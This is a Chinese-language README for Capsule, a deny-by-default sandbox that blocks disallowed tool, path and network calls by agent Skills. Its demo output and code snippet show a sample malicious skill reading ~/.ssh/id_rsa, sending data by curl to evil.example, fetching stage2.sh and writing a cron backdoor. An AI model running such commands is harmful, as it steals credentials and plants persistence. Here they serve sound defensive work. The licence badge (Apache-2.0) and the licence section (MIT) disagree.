<div align="right"><sub><a href="./README.en.md">English</a>&nbsp;&nbsp;⇄&nbsp;&nbsp;<b>简体中文</b></sub></div>

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
    <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
    <img src="./assets/hero-light.svg" width="880" alt="Capsule — 给 agent 技能套一层 seccomp 式运行时能力沙箱">
  </picture>
</p>

<p align="center"><sub>seccomp 式的运行时能力沙箱：在调用点逐次拦截每个 Skill 的工具、路径与网络调用。</sub></p>

<p align="center">
  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-black" alt="license"></a>
  <img src="https://img.shields.io/github/v/release/SuperMarioYL/capsule" alt="latest release">
  <a href="https://github.com/SuperMarioYL/capsule/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/SuperMarioYL/capsule/ci.yml?branch=main" alt="CI"></a>
  <img src="https://img.shields.io/badge/python-3.12%2B-3776AB" alt="python">
  <img src="https://img.shields.io/badge/Skill-sandbox-E0245E" alt="Skill sandbox">
  <img src="https://img.shields.io/badge/Claude%20Code-host-5E5CE6" alt="Claude Code host">
</p>

**装进 Claude Code / Codex Cli 的第三方 Skill 一旦加载就能在运行时调用任意工具、读任意路径、连任意外网——Capsule 给每个 Skill 套一层 deny-by-default 的能力沙箱，越界的调用在调用点被当场拦下，而不是事后才在审计日志里看到。**

Capsule 把操作系统的能力安全 / seccomp-bpf 原语搬进 agent 技能域。它要解决的不是"装载前验签"（那是 load-time 证明该做的事），也不是"事后记录改了什么"（像 [ponytrail](https://github.com/0xroylee/ponytrail) 那样的审计工具）——而是**在每一次工具调用真正发生的那一刻**复检它是否在技能声明的能力范围内，越界即拦截并记录。这正是 [affaan-m/everything-claude-code](https://github.com/affaan-m/everything-claude-code) 这类技能生态缺的那层：你已经装了一千多个 Skill，却没有任何东西在运行时拦住其中作恶的那一个。

## 目录

- [为什么需要它](#为什么需要它)
- [对比 ponytrail](#对比-0xroyleeponytrail)
- [架构](#架构)
- [安装](#安装)
- [快速开始](#快速开始)
- [用法](#用法)
- [Demo](#demo)
- [能力profile 配置](#能力-profile-配置)
- [付费 / 托管控制面](#付费--托管控制面)
- [路线图](#路线图)
- [许可](#许可)

## 为什么需要它

可装载的 agent 技能在最近半年从新奇变成默认：一个库就分发 1,600+ 个 Skill，任何宿主（Claude Code、Cursor、Codex Cli、Gemini CLI）都能加载，而被加载的技能可以在运行时静默地调用任意工具、读任意路径、跑任意 shell。现有工具要么在**装载前**验签验范围（装载后即君子协定），要么**事后**记录已经发生的改动；没有任何东西在调用点拦下那次越界。Capsule 填的就是这个缺口：让安全敏感的团队能在 deny-by-default 的能力 profile 下跑不信任的技能，违规调用在发生的那一刻被拦截并记录。

### 对比 [0xroylee/ponytrail](https://github.com/0xroylee/ponytrail)

ponytrail 是离它最近的相邻物——同样关心 agent 的运行时信任，但它**记录**改动、Capsule **拦截**调用。这不是谁更好的问题，而是「检测 vs 预防」两种立场，诚实地放在一起对比：

| 能力轴 | Capsule | ponytrail |
|---|:---:|:---:|
| 调用点拦截越界调用（违规调用根本不执行） | ✓ | — |
| Deny-by-default 能力 profile（工具 / 路径 / 网络） | ✓ | — |
| 零配置、自动记录真实改动（无需先写 profile） | — | ✓ |
| 事后审计 / 取证可读性 | partial | ✓ |
| 不修改宿主、被动旁路（接入成本最低） | partial | ✓ |

简言之：要**事后看清楚改了什么**、又不想写任何配置，ponytrail 更省事；要在越界调用**真正发生前把它拦下**，那是 Capsule 的位置。两者互补，不冲突。

<h2 id="架构"><img src="https://api.iconify.design/tabler:topology-star-3.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 架构</h2>

单进程、无服务、无守护进程。宿主适配器把每次工具调用归约成一个 `CallRequest`，策略引擎对照能力 profile 给出 `Decision`，allow 放行、deny 在 trap 层拦下并记录，`capsule report` 再把一次运行渲染成"放行 vs 拦截"的报表。

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
    <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
    <img src="./assets/atlas-light.svg" width="880" alt="架构：Claude Code 适配器 → CallRequest → 策略引擎（读能力 profile）→ ALLOW 放行 / DENY 拦截并记录 → capsule report">
  </picture>
</p>

`hosts/claude_code.py` 是 v0.1 唯一的宿主适配器：它知道 Claude Code 把工具调用路由到哪里，提供单一的拦截点。其余一切都与宿主无关——加一个新宿主只是再写一个这样的文件，不动引擎。

<h2 id="安装"><img src="https://api.iconify.design/tabler:rocket.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 安装</h2>

```bash
pip install capsule-agent          # 或 uv tool install capsule-agent
```

<h2 id="快速开始"><img src="https://api.iconify.design/tabler:rocket.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 快速开始</h2>

从冷克隆到看见第一条 `DENIED`，三条命令：

```bash
git clone https://github.com/SuperMarioYL/capsule && cd capsule && pip install -e .
capsule run -p examples/profiles/network-deny.yaml --skill examples/skills/curl-exfil-demo/SKILL.md
capsule report
```

<details>
<summary>示例输出（恶意 demo 技能被拦截）</summary>

```text
ALLOWED tool=read_file cmd="Read ./README.md" skill=curl-exfil-demo reason=allowed
DENIED  tool=shell     cmd="cat ~/.ssh/id_rsa"                 skill=curl-exfil-demo reason=path-denied
DENIED  tool=shell     cmd="curl -s https://evil.example/..."  skill=curl-exfil-demo reason=network-not-in-profile
DENIED  tool=net_fetch cmd="https://evil.example/stage2.sh"    skill=curl-exfil-demo reason=network-not-in-profile
DENIED  tool=edit_file cmd="Write /etc/cron.d/backdoor"        skill=curl-exfil-demo reason=path-not-in-profile

session complete — 1 allowed, 4 blocked.
```

一次合法读放行，四次外泄尝试被拦。`curl` 从未触网，`~/.ssh/id_rsa` 从未被读。

</details>

<h2 id="用法"><img src="https://api.iconify.design/tabler:terminal-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 用法</h2>

Capsule 有三个子命令：

```bash
# 1) 校验一个能力 profile，看它授予了什么（可作 CI / pre-commit 闸门）
capsule check -p examples/profiles/network-deny.yaml

# 2) 在某个 profile 下跑一个 Skill —— 越界调用在调用点被拦下
capsule run -p examples/profiles/network-deny.yaml \
            --skill examples/skills/curl-exfil-demo/SKILL.md

# 3) 渲染一次运行的"放行 vs 拦截"报表
capsule report
```

把 Capsule 接进一个真实宿主时，用 `capsule.hosts.claude_code.ClaudeCodeAdapter` 作为拦截点——它把宿主的工具调用事件归约成能力检查：

```python
from capsule.interpose import Interposer
from capsule.hosts.claude_code import ClaudeCodeAdapter
from capsule.profile import load_profile_file

profile = load_profile_file("examples/profiles/network-deny.yaml")
adapter = ClaudeCodeAdapter(Interposer(profile))

# 用 Capsule 包住宿主的工具分发：被拦的工具永远不会真正执行
dispatch = adapter.guard_tool_use(host.run_tool)
dispatch("Bash", {"command": "curl https://evil.example"})   # -> CapabilityViolation
```

更多示例见 [`examples/`](./examples)。

<h2 id="demo"><img src="https://api.iconify.design/tabler:photo.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> Demo</h2>

![demo](assets/demo.gif)

<h2 id="能力-profile-配置"><img src="https://api.iconify.design/tabler:adjustments.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 能力 profile 配置</h2>

一个能力 profile 是一份 deny-by-default 的 YAML 文档，绑定到一个 Skill：

| 字段 | 类型 | 默认 | 含义 |
|---|---|---|---|
| `skill` | string | （必填） | 本 profile 绑定的 Skill 名 |
| `default` | string | `deny` | v0.1 只支持 `deny`；没有授予即拒绝 |
| `tools` | list | `[]` | 允许调用的工具动词（`read_file` / `edit_file` / `shell` / `net_fetch`）；其余拒绝 |
| `paths.read` | list | `[]` | 可读的路径 glob（`./**` 锚定运行目录） |
| `paths.write` | list | `[]` | 可写的路径 glob |
| `paths.deny` | list | `[]` | 永远拒绝的路径——deny 永远压过 read/write |
| `network.allow` | list | `[]` | 允许出网的主机；空 = 完全禁止出网 |

```yaml
skill: curl-exfil-demo
default: deny
tools: [read_file, edit_file]
paths:
  read:  ["./**"]
  write: ["./out/**"]
  deny:  ["~/.ssh/**", "~/.aws/**"]
network:
  allow: []          # 空 = 零出网
```

<h2 id="付费--托管控制面"><img src="https://api.iconify.design/tabler:building-store.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 付费 / 托管控制面</h2>

本地引擎是免费开源的，单机够用。当一个团队需要把同一份策略下发到很多台机器、把违规聚合到一处、并留存审计时——这是 CLI 做不到的事——就有了**托管控制面（路线图）**：

- 把一份 `network-deny` profile 集中下发到 N 台开发机；
- 违规告警聚合到一个面板；
- 审计留存与合规报表。

定位：自托管免费 + 托管付费，按席位计费（早期定价区间约 $15–25 / 工程师 / 月，团队版 ~10 席起）。v0.1 不含任何付费墙——托管层是路线图承诺，不是开源功能的阉割。想试托管试点（把一份 profile 推到 5 台机器、在面板里看聚合拦截）可在 [Issues](https://github.com/SuperMarioYL/capsule/issues) 留言。

<h2 id="路线图"><img src="https://api.iconify.design/tabler:map-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 路线图</h2>

- [x] **m1 — 调用点拦截**：deny-by-default 能力 profile 在调用点拦下并记录越界调用
- [x] **m2 — profile + 报表**：YAML 能力 profile schema、按技能名绑定、`capsule report` 渲染放行 vs 拦截
- [x] **m3 — demo + 快速开始**：可复现的 `curl-exfil-demo`，<5 分钟看到真实拦截
- [ ] 更多宿主（Cursor / Codex Cli / Gemini CLI）
- [ ] 托管策略下发 + 违规聚合 + 审计留存（控制面）
- [ ] 签名 / 证明的能力 manifest（信任徽章层）
- [ ] 内核 seccomp-bpf 系统调用过滤（v0.1 在工具调用层拦截，借的是模型不是内核机制）

## 许可

[MIT](./LICENSE)。欢迎在 [Issues](https://github.com/SuperMarioYL/capsule/issues) 提需求或 bug，PR 同样欢迎。

## Share this

```text
Capsule — a seccomp-style runtime sandbox for every Skill you load into Claude Code.
It blocks the disallowed call at the call site, not in an after-the-fact audit.
https://github.com/SuperMarioYL/capsule
```

<p align="center"><sub><a href="./LICENSE">MIT</a> © 2026 SuperMarioYL</sub></p>
